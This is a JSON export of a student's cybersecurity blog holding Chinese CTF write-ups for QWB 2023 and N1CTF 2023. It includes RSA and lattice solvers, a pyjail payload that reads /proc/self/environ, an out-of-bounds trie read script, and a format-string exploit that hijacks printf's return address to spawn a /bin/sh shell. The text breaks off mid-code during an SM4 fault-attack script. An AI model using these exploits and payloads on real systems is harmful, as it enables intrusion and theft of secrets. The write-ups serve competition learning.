{"meta":{"title":"lmarch2'blog","subtitle":"求知若渴，虚心若愚","description":"A Student studying Cybersecurity","author":"lmarch2","url":"http://lmarch2.github.com","root":"/"},"pages":[{"title":"about","date":"2023-01-13T01:47:46.000Z","updated":"2023-01-13T01:48:19.952Z","comments":true,"path":"about/index.html","permalink":"http://lmarch2.github.com/about/index.html","excerpt":"","text":""},{"title":"categories","date":"2023-01-12T14:55:53.000Z","updated":"2023-01-12T15:19:18.583Z","comments":true,"path":"categories/index.html","permalink":"http://lmarch2.github.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2023-01-12T09:51:25.000Z","updated":"2023-01-12T10:26:42.615Z","comments":true,"path":"tags/index.html","permalink":"http://lmarch2.github.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"HASHTEAM强网杯2024wp","slug":"HASHTEAM强网杯2024WP","date":"2024-01-29T16:47:18.000Z","updated":"2024-01-31T06:49:15.331Z","comments":true,"path":"posts/19b7e153/","link":"","permalink":"http://lmarch2.github.com/posts/19b7e153/","excerpt":"2023强网杯强网杯疯狂坐牢，pwn做不了一点只能在强网先锋划划水….只能说，来年再战！","text":"2023强网杯强网杯疯狂坐牢，pwn做不了一点只能在强网先锋划划水….只能说，来年再战！ CryptoNot only rsa开就完了,直接上代码 123456789101112131415from Crypto.Util.number import *from tqdm import tqdmn = 6249734963373034215610144758924910630356277447014258270888329547267471837899275103421406467763122499270790512099702898939814547982931674247240623063334781529511973585977522269522704997379194673181703247780179146749499072297334876619475914747479522310651303344623434565831770309615574478274456549054332451773452773119453059618433160299319070430295124113199473337940505806777950838270849e = 641747c = 730024611795626517480532940587152891926416120514706825368440230330259913837764632826884065065554839415540061752397144140563698277864414584568812699048873820551131185796851863064509294123861487954267708318027370912496252338232193619491860340395824180108335802813022066531232025997349683725357024257420090981323217296019482516072036780365510855555146547481407283231721904830868033930943p=91027438112295439314606669837102361953591324472804851543344131406676387779969F=Zmod(n)root=F(c).nth_root(e,all=True)#print(root[0])for i in tqdm(root): m=long_to_bytes(int(i)) if b&#x27;flag&#x27; in m: print(m) flag{c19c3ec0-d489-4bbb-83fc-bc0419a6822a} Babyrsa论文题,搜了半天https://www.sciencedirect.com/science/article/pii/S0304397523002116 接下来是复现代码,但最后没能求出解 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101from math import floorN=6898173619848064713447564687612858995735894135343384489074201607621085283538310939996931861826971767108397996532717248188385645126212591434896047930808649179911798954640222107637439329674735608839417381358005576992626135001753481619659559186340117078191830600433093397242376731829372681835293083621809e=18607371079843502780378872043757955319820913116247483798885064959406363250603378245586504841113742273225193107044375347430381173075888621199154655015790594262611354939631226770280837471203456810631351598504038204190312822325230950609345436371947238885587725399278901711345945547722129359115083215511568569473191308964154024336081584451627244805369215138746534093267741448684155642482008850649100654786552416480077517243070018360909360575406706389289250072987726362674233556989150088794863182955760986933773623415912617726008667185604638388708370787554333594517677850758769655741063461283985588988450577# N=611402847577596838649117628567007514815745193613363898749361# e=256620536587836325389289742308993660982466972819568896656661249105081887104266414292000389611061562475252796784804753727def small_roots(f, bounds, m, d=None): monomials=[] pols=[] if not d: d = f.degree() R = f.base_ring() N = R.cardinality() f /= f.coefficients().pop(0) f = f.change_ring(ZZ) G = Sequence([], f.parent()) for s in range(m + 1): for i in range(s,m+1): for j in range(2*s,2*s+2): base = x ^ (i - s)* y ^(j-2*s) * f ^ s * e ^ (m - s) G.append(base) for s in range(m + 1): for i in range(s,s+1): for j in range(2*s+2,2*s+t+1): base = x ^ (i - s)* y ^(j-2*s) * f ^ s * e ^ (m - s) G.append(base) for poly in G: for v in poly.monomials(): if v not in monomials: monomials.append(v) print(len(G)) B, monomials = G.coefficient_matrix() monomials = vector(monomials) factors = [monomial(*bounds) for monomial in monomials] for i, factor in enumerate(factors): B.rescale_col(i, factor) print(B.nrows(),B.ncols()) B = B.dense_matrix().LLL() B = B.change_ring(QQ) for i, factor in enumerate(factors): B.rescale_col(i, 1 / factor) H = Sequence([], f.parent().change_ring(QQ)) for h in filter(None, B * monomials): H.append(h) I = H.ideal() if I.dimension() == -1: H.pop() elif I.dimension() == 0: roots = [] for root in I.variety(ring=ZZ): root = tuple(R(root[var]) for var in f.variables()) roots.append(root) return roots return []alpha=1.997beta=0.1delta=0.678r=100m=4t=4FF=Zmod(2^r)u=FF(N).nth_root(2,all=True)print(&quot;u=&quot;,u)#u0=63161u0=603393209736955919317955738297v0=2*u0+(N-u0^2)*inverse_mod(u0,2^(2*r))%2^(2*r)print(&quot;v0=&quot;,v0)#v0=200472128882#v0=1567679278734573458233752031864430279097731087941138563289698a1=v0*inverse_mod(2^(2*r-1),e)%eprint(a1)a2=(v0^2-(N+1)^2)*inverse_mod(2^(4*r),e)%eprint(a2)a3=(-1)*inverse_mod(2^(4*r),e)%eprint(a3)X=floor(2*N^(alpha+delta-2))Y=floor(3*N^(0.5-2*beta))print(&#x27;X&#x27;,X)print(&quot;Y&quot;,Y)F.&lt;x,y&gt;=PolynomialRing(ZZ)f=x*y^2+a1*x*y+a2*x+a3res=small_roots(f,(X,Y),m)print(res) MiscHappy Chess|SOLVED|1r0ny非常凑巧，前几周看到了b站上的一个翻转棋的视频 那么思路如下： 首先对于初始棋盘来说，只要把白棋或者黑棋的位置都点一遍就可以变成相同颜色 但是规定要240步之内赢10局，所以每局就有步数限制，要在大约24步之内赢一局 所以要进行步骤的优化，优化思路如下： 对于9*9的棋盘如果把一整行或者一整列全部翻转，就会把整个棋盘直接翻转 所以对于每一个可行解，可以通过观察来进行步骤的优化 把每一次的步骤优化到24步以内之后通关即可： 本题运用b站视频里的优化原理，手动玩了10次，每次步数均在24步以内，成功拿到flag flag{1449c7f2379d58899db438adc243867d} 由于时间充裕，所以我是用手优化的，但是其实可以使用脚本爆破，一共有9+9&#x3D;18条可以翻转的行和列，所以所有可行解的情况就有$$2^{18}$$种情况，只要使用代码全部爆破出来然后看哪个点最少就行。 Pyjail ! It’s myFILTER !!!读环境变量获取flag 1&#123;print(open(&quot;/proc/self/environ&quot;).read())&#125; 强网先锋石头剪刀布？该模型对于相同输入的输出具有确定性，于是可以先指定前五个，再逐轮爆破 12345678910111213141516171819202122232425262728293031323334353637383940####### 180from random import choiceimport randomfrom pwn import *def main(): # 设置目标地址和端口 ip = &#x27;8.147.133.95&#x27;#&#x27;8.147.135.248&#x27; port = 19260#39167 context(log_level = &#x27;debug&#x27;,os = &#x27;linux&#x27;) # 创建一个连接到目标的socket #choice = [0, 0, 0, 0, 0, 1, 1, 2, 2, 0, 1, 2, 0, 2, 0, 2, 1, 0, 2, 1, 1, 0, 0, 1, 1, 1,2] choice=[0, 0, 0, 0, 0, 1, 1, 2, 2, 0, 1, 2, 0, 2, 0, 2, 1, 0, 2, 1, 1, 0, 0, 1, 1, 1, 2, 2, 2, 0, 0, 1, 2, 0, 0, 2, 2, 1, 1, 0, 1, 2, 0, 1, 0, 1, 0, 2, 1, 2, 2, 0, 2, 1, 0, 0, 2, 2, 1, 1, 0, 1, 0, 1, 2, 0, 2, 0, 2, 1, 0, 2, 1, 0, 0, 1, 1, 1, 2, 2, 1, 0, 1, 2, 2, 0, 1, 2, 0, 2, 0, 1, 1, 0] sock = remote(ip, port) response = sock.recvuntil(&#x27;++++++++++++++++++++++++++++++++++++++++++++++++++&#x27;.encode()) with open(&#x27;replay.txt&#x27;, &#x27;w&#x27;) as f: choice.append(random.randint(0,2)) print(choice) for i in range(len(choice)): sock.sendlineafter(&#x27;请出拳（0 - 石头，1 - 剪刀，2 - 布）：&#x27;.encode(),str(choice[i]).encode()) response = sock.recv(0x110).decode() f.write(response + &#x27;\\n&#x27;) if(i &lt; 5): continue if &#x27;Me10n赢了&#x27; in response: print(i,choice[i]) print(choice) print((choice[i]+1)%3) break elif &#x27;平局&#x27; in response: print(i,choice[i]) print(choice) print((choice[i]+2)%3) break f.interactive() # 关闭连接 sock.close()if __name__ == &#x27;__main__&#x27;: main() Speedup先看看前20个 12345678910111213from math import floorfrom tqdm import tqdmn=0l=[]for i in range(1,21): n=0 result = factorial(2^i) res=str(result) for j in res: n+=int(j) print(n) l.append(n)print(l) 输到这里https://oeis.org/数数第27个,做个md5得到结果 或者利用勒让德定理,分解(2^27)! 1234567891011121314151617181920212223242526272829n=2^27faclist=[]for p in tqdm(range(2,n)): if is_prime(p): k=1 res=0 while True: m=pow(p,k) if n&gt;=m: res+=floor(n/m) else: break k+=1 faclist.append((p,res)) else: continue # faclist=str(faclist)# with open(&#x27;test.txt&#x27;, &#x27;w&#x27;) as f: # f.write(faclist)res=1for i in tqdm(faclist): res*=pow(i[0],i[1]) n=0for i in str(res): n+=int(i)print(n) 然后再计算 easyfuzz开始先发现9个字符+\\n能够吧前两位置为11，尝试遍历所有字符可能 调整输入的字符串，从最后一位开始诸位爆破（代码中逐个改repeat） 12345678910111213141516171819202122232425262728293031323334353637from Excalibur import *import itertoolsimport stringdef generate_strings(): # 定义要包含的字符集合 characters = string.ascii_letters + string.digits + string.punctuation # 生成所有长度为9的可能字符串 all_combinations = itertools.product(characters, repeat=3) # 逐个生成字符串并返回 for combination in all_combinations: yield &#x27;&#x27;.join(combination)# 使用生成器函数逐个获取字符串string_generator = generate_strings()# 打印前几个字符串#contextset()remo(&#x27;101.200.122.251&#x27;,12199,1)#remo(&#x27;101.200.122.251&#x27;,12188,1)for _ in range(1000): str = (next(string_generator)+&#x27;wbGood&#x27;) sl(str) ru(b&#x27;code&#x27;) m = ru(b&#x27;\\n&#x27;) if not b&#x27;110000000&#x27; in m: print(str,m)#sl(b&#x27;1&#x27;*9)#sl(b&#x27;\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff&#x27;)#sl(b&#x27;\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff&#x27;)ia() qwb{YouKnowHowToFuzz!} Trie手动硬搓，也可以写脚本更快 首先理清程序逻辑，在trie树中储存ip，查找时通过控制v3的值，越界读取end数组，从secret里读出flag 调试发现，对于树中每插入节点的时候，tot+1，于是首先让tot为0x40，再控制ip（在二进制下每次减少一个1）使得tot每次+4，即可4字节4字节地读出flag。（需要注意的是会对tot进行一个*4的操作） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from Excalibur import *#proc(&#x27;./trie&#x27;)remo(&#x27;47.104.150.173&#x27;,1337,1)contextset()&#x27;&#x27;&#x27;for i in range(100): ip1 = &#x27;192.168.1.&#x27;+(str(i)) sla(b&#x27;Quit.&#x27;,b&#x27;1&#x27;) sla(b&#x27;IP:&#x27;,ip1) ip2 = &#x27;192.168.1.&#x27;+str(i+1) sla(b&#x27;hop:&#x27;,ip2)sla(b&#x27;Quit.&#x27;,b&#x27;2&#x27;)&#x27;&#x27;&#x27;def setip(ip1,ip2): sla(b&#x27;Quit.&#x27;,b&#x27;1&#x27;) sla(b&#x27;IP:&#x27;,ip1) sla(b&#x27;hop:&#x27;,ip2)def show(ip): sla(b&#x27;Quit.&#x27;,b&#x27;3&#x27;) sla(b&#x27;Quit.&#x27;,b&#x27;2&#x27;) sla(b&#x27;IP:&#x27;,ip) ru(b&#x27;is&#x27;) flag = ru(b&#x27;\\n&#x27;) print(flag) pause()debug(&#x27;b *$rebase(0x4060)\\nb *$rebase(0x1619)\\n&#x27;)setip(b&#x27;0.0.0.0&#x27;,b&#x27;0.0.0.0&#x27;)#+0x20setip(b&#x27;255.255.255.255&#x27;,b&#x27;0.0.0.0&#x27;)#+0x20#setip(b&#x27;127.255.255.255&#x27;,b&#x27;0.0.0.0&#x27;)#+0x4#setip(b&#x27;63.255.255.255&#x27;,b&#x27;0.0.0.0&#x27;)#+0x4#setip(b&#x27;31.255.255.255&#x27;,b&#x27;0.0.0.0&#x27;)#+0x4#setip(b&#x27;15.255.255.255&#x27;,b&#x27;0.0.0.0&#x27;)#+0x4#setip(b&#x27;7.255.255.255&#x27;,b&#x27;0.0.0.0&#x27;)#+0x4#setip(b&#x27;3.255.255.255&#x27;,b&#x27;0.0.0.0&#x27;)#+0x4#setip(b&#x27;1.255.255.255&#x27;,b&#x27;0.0.0.0&#x27;)#+0x4#setip(b&#x27;0.255.255.255&#x27;,b&#x27;0.0.0.0&#x27;)#+0x4#setip(b&#x27;0.127.255.255&#x27;,b&#x27;0.0.0.0&#x27;)#+0x4#setip(b&#x27;0.63.255.255&#x27;,b&#x27;0.0.0.0&#x27;)#+0x4setip(b&#x27;0.31.255.255&#x27;,b&#x27;0.0.0.0&#x27;)#+0x4#setip(b&#x27;0.255.255.255&#x27;,b&#x27;0.0.0.0&#x27;)#+0x4#show(b&#x27;127.255.255.255&#x27;)#show(b&#x27;63.255.255.255&#x27;)#show(b&#x27;31.255.255.255&#x27;)#show(b&#x27;15.255.255.255&#x27;)#show(b&#x27;7.255.255.255&#x27;)#show(b&#x27;3.255.255.255&#x27;)#show(b&#x27;1.255.255.255&#x27;)#show(b&#x27;0.255.255.255&#x27;)#show(b&#x27;0.127.255.255&#x27;)#show(b&#x27;0.63.255.255&#x27;)show(b&#x27;0.31.255.255&#x27;)ia()numbers = &quot;0.0.0.125.115.121.117.103.95.117.48.121.95.115.64.95.103.110.48.114.116.115.95.53.97.95.51.109.48.99.51.66.95.48.116.95.119.48.72.123.103.97.108.102&quot;reversed_numbers = numbers.split(&quot;.&quot;)[::-1]ascii_chars = [chr(int(num)) for num in reversed_numbers]result = &quot;&quot;.join(ascii_chars)print(result) flag{H0w_t0_B3c0m3_a5_str0ng_@s_y0u_guys} ez_fmt修改printf的返回地址劫持程序流，同时泄漏libc地址，第二次printf改返回地址为one_shot,这里不能以下写ln不然会特别慢。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from evilblade import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)setup(&#x27;./pwn&#x27;)libset(&#x27;./libc-2.31.so&#x27;)#libset(&#x27;./libc.so.6&#x27;)evgdb()rsetup(&#x27;47.104.24.40&#x27;, 1337)stack = getx(-15,-1)stack1 = stack - 8dx(stack1)#修改printf的返回地址sd(b&#x27;%4198556c&#x27;+b&#x27;%19$paaa&#x27;+b&#x27;aaa%9$n&#x27;+p64(stack1))libc = getx(-65,-51)base = getbase(libc,&#x27;__libc_start_main&#x27;,243)os = base + 0xe3b01os1 = os %0x10000os2 = os %0x1000000os2 = os2 &gt;&gt; 16dx(stack)dx(os)pay1 = f&#x27;%&#123;os2-4&#125;c&#x27;.encode().ljust(8,b&#x27;a&#x27;)pay2 = f&#x27;%&#123;os1-os2-3&#125;c&#x27;.encode().ljust(8,b&#x27;a&#x27;)print(pay1)pay = pay1 + b&#x27;a%11$hhn&#x27;+ pay2 +b&#x27;aa%10$hn&#x27; +p64(stack-232)+p64(stack-230)print(len(pay))pause()sl(pay)ia()&#x27;&#x27;&#x27;0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)constraints: [r15] == NULL || r15 == NULL [r12] == NULL || r12 == NULL0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)constraints: [r15] == NULL || r15 == NULL [rdx] == NULL || rdx == NULL0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)constraints: [rsi] == NULL || rsi == NULL [rdx] == NULL || rdx == NULL&#x27;&#x27;&#x27; flag{such_@n_ea5y_fmt_9ame_f0r_y0u}","categories":[{"name":"HASHTEAM'wp","slug":"HASHTEAM-wp","permalink":"http://lmarch2.github.com/categories/HASHTEAM-wp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.com/tags/ctf/"}]},{"title":"HASHTEAM-n1ctf-2023-WP","slug":"HASHTEAMn1ctf2023WP","date":"2024-01-29T15:47:41.000Z","updated":"2024-01-31T02:57:32.529Z","comments":true,"path":"posts/d8c86fdf/","link":"","permalink":"http://lmarch2.github.com/posts/d8c86fdf/","excerpt":"N1CTF2023 排名25，卡线","text":"N1CTF2023 排名25，卡线 Cryptowarmupnonce有问题 数学模型： e&#x3D;2^128*e1+e2 d&#x3D;2^128*d1+d2 nonce&#x3D;2^128*e1+d1 s&#x3D;(e+rd)&#x2F;nonce mod n 展开 s2^128e1+sd1&#x3D;2^128e1+e2+r*(2^128*d1+d2) mod n (s-1)2^128e1+(s-r*2^128)d1-rd2-e2&#x3D;&#x3D;0 mod n 造格子 注意到d最高2^255一定为1，卡下界 SM4差分故障打四轮，直接上脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304from copy import copyDB = [[46, 38, 43, 106, 114, 176, 12, 69, 1, 21, 82, 27, 184, 109, 170, 0, 179, 25, 4, 145, 33, 61, 66, 223, 85, 238, 22, 23, 59, 64, 19, 174, 180, 240, 111, 128, 187, 65, 72, 35, 77, 221, 157, 172, 13, 197, 44, 229, 226, 130, 220, 49, 198, 24, 103, 76, 39, 211, 191, 115, 165, 206, 30, 7, 98, 156, 205, 181, 89, 252, 58, 138, 253, 104, 212, 236, 54, 224, 166, 155, 118, 8, 93, 140, 28, 95, 225, 248, 80, 182, 112, 63, 192, 116, 47, 217, 91, 84, 144, 53, 124, 117, 16, 73, 218, 254, 188, 18, 11, 107, 222, 5, 52, 129, 194, 173, 81, 9, 137, 246, 242, 143, 175, 147, 74, 195, 41, 133, 207, 120, 92, 17, 164, 169, 171, 48, 241, 57, 31, 83, 55, 96, 29, 185, 68, 232, 70, 148, 243, 209, 100, 214, 37, 244, 219, 131, 203, 139, 126, 183, 167, 199, 101, 159, 50, 230, 168, 45, 149, 123, 119, 87, 134, 75, 127, 67, 250, 228, 247, 135, 113, 60, 62, 177, 150, 121, 162, 227, 142, 34, 178, 42, 15, 160, 161, 216, 235, 234, 163, 186, 154, 141, 233, 208, 78, 151, 204, 190, 86, 152, 245, 239, 108, 196, 158, 210, 99, 237, 251, 3, 40, 90, 125, 132, 36, 215, 193, 71, 255, 200, 102, 56, 32, 136, 146, 79, 97, 110, 249, 20, 202, 231, 122, 88, 94, 6, 153, 105, 14, 10, 2, 201, 189, 213, 51, 26], [246, 56, 103, 21, 181, 105, 216, 118, 145, 183, 169, 211, 27, 242, 190, 162, 237, 179, 244, 199, 206, 35, 120, 38, 95, 133, 25, 231, 3, 70, 40, 238, 223, 45, 127, 245, 4, 15, 250, 11, 52, 215, 142, 129, 167, 191, 61, 241, 188, 226, 249, 146, 221, 184, 104, 109, 157, 39, 176, 114, 236, 240, 254, 253, 251, 158, 198, 37, 42, 19, 87, 230, 153, 43, 77, 76, 208, 26, 32, 18, 150, 195, 122, 90, 80, 148, 197, 44, 83, 51, 166, 75, 88, 73, 64, 252, 20, 119, 46, 201, 196, 121, 222, 115, 22, 128, 164, 102, 97, 5, 217, 172, 177, 81, 58, 234, 168, 60, 29, 124, 147, 101, 224, 151, 130, 65, 98, 225, 155, 91, 108, 152, 140, 219, 9, 24, 189, 203, 138, 160, 59, 48, 193, 14, 69, 159, 233, 53, 135, 143, 33, 165, 41, 132, 57, 187, 227, 93, 200, 1, 0, 149, 137, 194, 23, 117, 170, 247, 17, 255, 92, 205, 47, 213, 136, 66, 2, 209, 6, 110, 78, 63, 28, 74, 235, 229, 30, 139, 154, 94, 131, 49, 86, 185, 163, 79, 68, 8, 72, 174, 99, 111, 141, 107, 210, 34, 207, 239, 106, 144, 228, 186, 89, 204, 55, 54, 171, 161, 100, 16, 13, 7, 50, 182, 112, 173, 212, 31, 214, 85, 156, 180, 175, 116, 248, 243, 36, 82, 134, 123, 220, 10, 125, 96, 67, 62, 12, 202, 126, 71, 84, 113, 232, 178, 192, 218], [46, 38, 43, 106, 114, 176, 12, 69, 1, 21, 82, 27, 184, 109, 170, 0, 179, 25, 4, 145, 33, 61, 66, 223, 85, 238, 22, 23, 59, 64, 19, 174, 180, 240, 111, 128, 187, 65, 72, 35, 77, 221, 157, 172, 13, 197, 44, 229, 226, 130, 220, 49, 198, 24, 103, 76, 39, 211, 191, 115, 165, 206, 30, 7, 98, 156, 205, 181, 89, 252, 58, 138, 253, 104, 212, 236, 54, 224, 166, 155, 118, 8, 93, 140, 28, 95, 225, 248, 80, 182, 112, 63, 192, 116, 47, 217, 91, 84, 144, 53, 124, 117, 16, 73, 218, 254, 188, 18, 11, 107, 222, 5, 52, 129, 194, 173, 81, 9, 137, 246, 242, 143, 175, 147, 74, 195, 41, 133, 207, 120, 92, 17, 164, 169, 171, 48, 241, 57, 31, 83, 55, 96, 29, 185, 68, 232, 70, 148, 243, 209, 100, 214, 37, 244, 219, 131, 203, 139, 126, 183, 167, 199, 101, 159, 50, 230, 168, 45, 149, 123, 119, 87, 134, 75, 127, 67, 250, 228, 247, 135, 113, 60, 62, 177, 150, 121, 162, 227, 142, 34, 178, 42, 15, 160, 161, 216, 235, 234, 163, 186, 154, 141, 233, 208, 78, 151, 204, 190, 86, 152, 245, 239, 108, 196, 158, 210, 99, 237, 251, 3, 40, 90, 125, 132, 36, 215, 193, 71, 255, 200, 102, 56, 32, 136, 146, 79, 97, 110, 249, 20, 202, 231, 122, 88, 94, 6, 153, 105, 14, 10, 2, 201, 189, 213, 51, 26], [206, 165, 193, 37, 187, 108, 248, 246, 44, 139, 152, 201, 173, 214, 77, 72, 97, 35, 70, 24, 3, 79, 178, 175, 30, 66, 18, 198, 114, 125, 32, 210, 180, 224, 235, 28, 62, 136, 149, 227, 82, 147, 90, 119, 85, 199, 126, 121, 51, 20, 88, 4, 75, 101, 38, 151, 109, 115, 110, 223, 43, 17, 146, 249, 226, 26, 222, 232, 87, 195, 200, 131, 245, 81, 113, 157, 220, 12, 16, 184, 204, 192, 84, 31, 197, 215, 129, 94, 93, 181, 218, 194, 65, 148, 158, 112, 221, 34, 25, 33, 243, 78, 10, 67, 209, 6, 252, 196, 237, 42, 172, 164, 161, 244, 111, 191, 46, 170, 128, 69, 183, 212, 60, 99, 8, 122, 49, 86, 247, 96, 179, 57, 135, 106, 0, 58, 100, 202, 55, 98, 1, 254, 53, 155, 156, 83, 132, 9, 19, 171, 48, 95, 166, 68, 22, 104, 7, 14, 142, 211, 213, 50, 150, 234, 182, 203, 217, 64, 185, 163, 73, 45, 41, 118, 103, 134, 186, 230, 241, 250, 52, 207, 162, 124, 140, 116, 167, 228, 92, 63, 47, 176, 239, 238, 5, 216, 225, 188, 137, 160, 80, 231, 102, 11, 89, 91, 59, 23, 240, 105, 153, 177, 138, 219, 174, 123, 36, 159, 76, 21, 56, 242, 61, 107, 133, 143, 154, 130, 233, 15, 145, 255, 13, 189, 120, 251, 236, 117, 208, 190, 169, 168, 74, 229, 54, 2, 39, 127, 29, 253, 141, 71, 205, 40, 144, 27]]WDB=DB[2:]+DB[:2]i2l = lambda x: [(x &gt;&gt; 24) &amp; 0xff, (x &gt;&gt; 16) &amp; 0xff, (x &gt;&gt; 8) &amp; 0xff, x &amp; 0xff]l2i = lambda x: (x[0] &lt;&lt; 24)|(x[1] &lt;&lt; 16)|(x[2] &lt;&lt; 8)|x[3]rotl32 = lambda x, n: ((x &lt;&lt; n) &amp; 0xffffffff) | ((x &gt;&gt; (32-n)) &amp; 0xffffffff)rotl8 = lambda x, n: ((x &lt;&lt; n) &amp; 0xff) | ((x &gt;&gt; (8-n)) &amp; 0xff)xor = lambda x, y: list(map(lambda a, b: a ^ b, x, y))pad = lambda data, block=16: data + [16 - len(data) % block]*(16 - len(data) % block)SM4_BOXES_TABLE = [ 0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c, 0x05, 0x2b, 0x67, 0x9a, 0x76, 0x2a, 0xbe, 0x04, 0xc3, 0xaa, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99, 0x9c, 0x42, 0x50, 0xf4, 0x91, 0xef, 0x98, 0x7a, 0x33, 0x54, 0x0b, 0x43, 0xed, 0xcf, 0xac, 0x62, 0xe4, 0xb3, 0x1c, 0xa9, 0xc9, 0x08, 0xe8, 0x95, 0x80, 0xdf, 0x94, 0xfa, 0x75, 0x8f, 0x3f, 0xa6, 0x47, 0x07, 0xa7, 0xfc, 0xf3, 0x73, 0x17, 0xba, 0x83, 0x59, 0x3c, 0x19, 0xe6, 0x85, 0x4f, 0xa8, 0x68, 0x6b, 0x81, 0xb2, 0x71, 0x64, 0xda, 0x8b, 0xf8, 0xeb, 0x0f, 0x4b, 0x70, 0x56, 0x9d, 0x35, 0x1e, 0x24, 0x0e, 0x5e, 0x63, 0x58, 0xd1, 0xa2, 0x25, 0x22, 0x7c, 0x3b, 0x01, 0x21, 0x78, 0x87, 0xd4, 0x00, 0x46, 0x57, 0x9f, 0xd3, 0x27, 0x52, 0x4c, 0x36, 0x02, 0xe7, 0xa0, 0xc4, 0xc8, 0x9e, 0xea, 0xbf, 0x8a, 0xd2, 0x40, 0xc7, 0x38, 0xb5, 0xa3, 0xf7, 0xf2, 0xce, 0xf9, 0x61, 0x15, 0xa1, 0xe0, 0xae, 0x5d, 0xa4, 0x9b, 0x34, 0x1a, 0x55, 0xad, 0x93, 0x32, 0x30, 0xf5, 0x8c, 0xb1, 0xe3, 0x1d, 0xf6, 0xe2, 0x2e, 0x82, 0x66, 0xca, 0x60, 0xc0, 0x29, 0x23, 0xab, 0x0d, 0x53, 0x4e, 0x6f, 0xd5, 0xdb, 0x37, 0x45, 0xde, 0xfd, 0x8e, 0x2f, 0x03, 0xff, 0x6a, 0x72, 0x6d, 0x6c, 0x5b, 0x51, 0x8d, 0x1b, 0xaf, 0x92, 0xbb, 0xdd, 0xbc, 0x7f, 0x11, 0xd9, 0x5c, 0x41, 0x1f, 0x10, 0x5a, 0xd8, 0x0a, 0xc1, 0x31, 0x88, 0xa5, 0xcd, 0x7b, 0xbd, 0x2d, 0x74, 0xd0, 0x12, 0xb8, 0xe5, 0xb4, 0xb0, 0x89, 0x69, 0x97, 0x4a, 0x0c, 0x96, 0x77, 0x7e, 0x65, 0xb9, 0xf1, 0x09, 0xc5, 0x6e, 0xc6, 0x84, 0x18, 0xf0, 0x7d, 0xec, 0x3a, 0xdc, 0x4d, 0x20, 0x79, 0xee, 0x5f, 0x3e, 0xd7, 0xcb, 0x39, 0x48,]SM4_FK = [0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc]SM4_CK = [ 0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269, 0x70777e85, 0x8c939aa1, 0xa8afb6bd, 0xc4cbd2d9, 0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249, 0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9, 0xc0c7ced5, 0xdce3eaf1, 0xf8ff060d, 0x141b2229, 0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299, 0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209, 0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279]Dance_Box=DBdef dance(): global Dance_Box Dance_Box = Dance_Box[2:]+Dance_Box[:2]def round_key(k): ar = [SM4_BOXES_TABLE[i] for i in i2l(k)] b = l2i(ar) return b ^ rotl32(b, 13) ^ rotl32(b, 23)def expand_key(master_key): master_key = list(master_key) MK = [l2i(master_key[:4]), l2i(master_key[4:8]),\\ l2i(master_key[8:12]), l2i(master_key[12:])] k = [0]*36 k[0:4] = xor(MK, SM4_FK) for i in range(32): k[i + 4] = k[i] ^ (round_key(k[i + 1] ^ k[i + 2] ^ k[i + 3] ^ SM4_CK[i])) return k[4:]def tfunc(bk): ar = [SM4_BOXES_TABLE[i] for i in i2l(bk)] b = l2i(ar) return b ^ rotl32(b, 2) ^ rotl32(b, 10) ^ rotl32(b, 18) ^ rotl32(b, 24)def invtfunc(b): b=d(b) ar=i2l(b) bk = [SM4_BOXES_TABLE.index(i) for i in ar] bk=l2i(bk) return bkdef pfunc(bk): res = [] for i in range(4): sbox = Dance_Box[i] ar = [sbox[_] for _ in i2l(bk[i])] b = [rotl8(ar[i], i+3) for i in range(4)] res.append(l2i(b)) return resdef invpfunc(res,D=DB): bk = [] for i in range(4): sbox = D[i] b=i2l(res[i]) ar=[rotl8(b[j], 8-(j+3)) for j in range(4)] bki=[sbox.index(_) for _ in ar] bk.append(l2i(bki)) return bkdef one_round(bk, rk, dt): out = [] buf = [0]*36 buf[:4] = [l2i(bk[:4]), l2i(bk[4:8]), l2i(bk[8:12]), l2i(bk[12:])] for i in range(32): if dt == i: dance() buf[i+4] = buf[i] ^ tfunc(buf[i+1]^buf[i+2]^buf[i+3]^rk[i]) buf[i+1:i+5] = pfunc(buf[i+1:i+5]) dance() for _ in range(4): out += i2l(buf[-1-_]) return outdef crypt_ecb(pt, key, dance_time=-1): pt = pad(list(pt)) rk = expand_key(key) block = [pt[_:_+16] for _ in range(0, len(pt), 16)] result = b&#x27;&#x27; for i in block: result += bytes(one_round(i, rk, dt=dance_time)) return resultt=lambda b:b ^ rotl32(b, 2) ^ rotl32(b, 10) ^ rotl32(b, 18) ^ rotl32(b, 24)d=lambda 